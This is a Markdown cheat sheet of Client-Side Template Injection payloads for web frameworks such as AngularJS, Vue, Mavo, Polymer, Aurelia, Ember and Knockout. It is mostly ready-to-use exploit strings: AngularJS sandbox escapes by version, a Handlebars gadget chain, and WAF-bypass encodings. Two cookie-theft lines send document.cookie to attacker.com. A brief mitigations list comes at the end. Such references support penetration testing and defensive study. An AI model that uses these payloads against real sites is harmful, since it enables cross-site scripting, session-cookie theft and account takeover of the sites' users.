# Client Side Template Injection (CSTI)

> Client-Side Template Injection occurs when user-supplied input is embedded unsafely into a client-side template (processed by the browser). Unlike SSTI, execution happens in JavaScript on the victim's browser, making it a vector for XSS and sandbox escapes.

---

## Table of Contents

- [Detection](#detection)
- [AngularJS](#angularjs)
- [Angular (2+)](#angular-2)
- [Vue.js](#vuejs)
- [Mavo](#mavo)
- [Polymer](#polymer)
- [Aurelia](#aurelia)
- [Ember.js](#emberjs)
- [Knockout.js](#knockoutjs)
- [References](#references)

---

## Detection

### Polyglot Probe

Submit these in any reflected input field and observe the rendered output:

```
{{7*7}}
${7*7}
{{7*'7'}}
<%= 7*7 %>
#{7*7}
*{7*7}
```

If the page renders `49` instead of the raw string, the application is vulnerable to CSTI.

### Identifying the Framework

| Probe | Expected Output | Framework |
|---|---|---|
| `{{7*7}}` | `49` | AngularJS, Vue.js, Ember |
| `{{7*'7'}}` | `7777777` | AngularJS |
| `${7*7}` | `49` | Knockout |
| `[[7*7]]` | `49` | Polymer |
| `*{7*7}` | `49` | Mavo |

---

## AngularJS

> Affects AngularJS **1.x** (legacy). Versions up to **1.5.0** are most exploitable. Later versions restricted sandbox escapes but bypasses were found up to 1.6.x.

### Basic Injection

```
{{7*7}}
{{constructor.toString()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

### XSS Payloads (varies by version)

**AngularJS 1.0.x – 1.1.x:**

```
{{constructor.constructor('alert(1)')()}}
```

**AngularJS 1.2.x:**

```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

**AngularJS 1.3.x:**

```
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}
```

**AngularJS 1.4.x:**

```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**AngularJS 1.5.x:**

```
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**AngularJS 1.6+ (no sandbox):**

```
{{constructor.constructor('alert(document.domain)')()}}
```

### Stealing Cookies (AngularJS 1.6+)

```
{{constructor.constructor('fetch("https://attacker.com/?c="+document.cookie)')()}}
```

### Filter/Sanitizer Bypass

```
// Using string concatenation
{{'al'+'ert(1)'|eval}}

// Using array join
{{[1]|orderBy:'[].constructor.constructor("alert(1)")()'}}
```

---

## Angular (2+)

> Angular 2+ removed `$eval` and the expression sandbox entirely. CSTI in Angular 2+ typically requires improper use of `innerHTML`, `bypassSecurityTrustHtml`, or dynamic template compilation.

### Unsafe Binding via `[innerHTML]`

If the application uses `[innerHTML]` with unsanitized user input:

```html
<img src=x onerror="alert(document.domain)">
<svg/onload=alert(1)>
```

### `bypassSecurityTrustHtml` Abuse

When Angular's DomSanitizer is bypassed:

```typescript
// Vulnerable code pattern
this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
```

Inject standard XSS payloads:

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
```

### Dynamic Template Compilation (JIT)

If the app uses `RuntimeCompiler` with user input:

```
{{constructor.constructor('alert(1)')()}}
```

---

## Vue.js

> CSTI in Vue.js occurs when user input is passed directly to `v-html`, `eval`, or used inside template strings rendered at runtime.

### Basic Injection (Vue 2)

```
{{constructor.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}
```

### Vue 2 — Template String Injection

```javascript
// Vulnerable pattern
new Vue({ template: '<div>' + userInput + '</div>' })
```

Payload:

```
<div>{{constructor.constructor('alert(document.domain)')()}}</div>
```

### Vue 3 — Template Injection

```
{{$el.ownerDocument.defaultView.alert(1)}}
```

### `v-html` Injection

When `v-html` binds unsanitized input:

```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
```

### XSS via Template Expression

```
{{toString().constructor.constructor('alert(1)')()}}
{{[].filter.constructor('alert(1)')()}}
```

### Steal Cookies

```
{{constructor.constructor('fetch("https://attacker.com/?c="+document.cookie)')()}}
```

---

## Mavo

> Mavo is a declarative web framework using `*{}` syntax for expressions.

### Basic Injection

```
*{7*7}
*{alert(1)}
```

### XSS

```
*{constructor.constructor('alert(1)')()}
```

### Read Page Data

```
*{document.cookie}
```

---

## Polymer

> Polymer uses `[[...]]` for one-way data binding and `{{...}}` for two-way binding.

### Basic Injection

```
[[7*7]]
{{7*7}}
```

### XSS

```
[[]]<img src=x onerror=alert(1)>
```

```
{{constructor.constructor('alert(1)')()}}
```

---

## Aurelia

> Aurelia uses `${...}` expressions for string interpolation.

### Basic Injection

```
${''.constructor.constructor('alert(1)')()}
```

### XSS

```
${new Function('alert(document.domain)')()}
```

---

## Ember.js

> Ember uses Handlebars as its template engine on the client side.

### Basic Injection

```
{{7*7}}
```

### XSS via Handlebars Prototype Pollution

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return alert(document.domain);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Knockout.js

> Knockout uses `data-bind` attributes and `${ }` syntax for template expressions.

### Basic Injection

```
${alert(1)}
```

### `data-bind` Injection

If user input is reflected inside a `data-bind` attribute:

```
text: alert(1)
text: (function(){alert(document.domain)})()
```

Example vulnerable HTML:

```html
<!-- Vulnerable pattern -->
<span data-bind="text: userInput"></span>
```

Injected value:

```
alert(1), x: $data.constructor.prototype
```

### XSS via ko.computed

```
ko.computed(function(){ return eval('alert(1)') })
```

---

## General Bypass Techniques

### String Concatenation

```
// Split keywords to bypass WAF filters
{{'al'+'ert(1)'}}
{{'con'+'structor'}}
```

### Unicode Escapes

```
{{'\u0061\u006c\u0065\u0072\u0074(1)'|eval}}
```

### Hex Escapes

```
{{'\x61\x6c\x65\x72\x74(1)'|eval}}
```

### Using Array Methods

```
{{[].filter.constructor('alert(1)')()}}
{{[].sort.call`${alert}1`}}
```

### Template Literals

```
{{`${alert(1)}`}}
```

### Prototype Chain Traversal

```
{{''.__proto__.constructor.constructor('alert(1)')()}}
{{[].__proto__.constructor.constructor('alert(1)')()}}
```

---

## Impact

| Action | Payload Type |
|---|---|
| Cookie theft | `fetch/XHR to attacker server` |
| Keylogging | `document.onkeypress hijack` |
| DOM manipulation | Direct JS execution |
| CSRF token theft | `document.querySelector` |
| Credential phishing | Fake login form injection |
| Full account takeover | Session cookie exfiltration |

---

## Mitigations

- Never interpolate user input directly into client-side templates
- Use framework-safe binding mechanisms (`textContent`, not `innerHTML`)
- Avoid `bypassSecurityTrustHtml` / `$sce.trustAsHtml` with user data
- Implement a strict **Content Security Policy (CSP)**
- Keep front-end frameworks updated — many sandbox escapes are version-specific
- Sanitize all reflected input server-side before it reaches the template

---

## References

- OWASP XSS Prevention Cheat Sheet
- PortSwigger Web Security Academy — Client-Side Template Injection
- HackTricks — CSTI
- Framework Docs:
  - [AngularJS Security](https://docs.angularjs.org/guide/security)
  - [Angular Security](https://angular.io/guide/security)
  - [Vue.js Security](https://vuejs.org/guide/best-practices/security)
